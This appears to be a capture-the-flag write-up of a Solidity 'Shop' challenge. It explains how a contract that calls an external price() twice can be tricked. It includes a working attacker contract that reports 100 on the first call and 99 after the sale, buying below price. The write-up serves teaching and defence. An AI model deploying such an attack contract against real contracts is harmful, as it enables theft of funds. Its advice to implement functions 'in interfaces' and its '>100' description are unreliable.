# Shop Challenge

**Intent:** The Shop contract is designed to sell an item at a specified price (100) using the Buyer interface to determine the buyer's price.

**Vulnerability:** The contract relies on the unimplemented `price()` function in the Buyer interface, allowing an attacker to create a malicious implementation. The contract also calls `price()` twice, enabling different return values on the first and second calls.

**Exploit:** An attacker creates a malicious contract with a custom `price()` function that returns a value >100 on the first call and <100 on the second call, bypassing the price check and purchasing the item at a lower price.

```solidity
contract ShopAttack {
    Shop private immutable target;

    uint private constant ATTACK_PRICE = 99;
    uint private constant ORIGINAL_PRICE = 100;

    constructor(address _target) {
        target = Shop(_target);
    }

    function attack() external {
        target.buy();
        require(target.price() == ATTACK_PRICE, "price != 99");
    }

    function price() external view returns (uint) {
        if (target.isSold()) {
            return ORIGINAL_PRICE - 1;
        }

        return ORIGINAL_PRICE;
    }
}
```

**Takeaways:**

1. Implement all functions in interfaces to prevent malicious implementations.
2. Avoid multiple calls to the same external function for crucial operations.

**Solutions:**

1. Implement the `price()` function within the Buyer interface.
2. Store the result of the first external function call in a variable and use that for further operations.
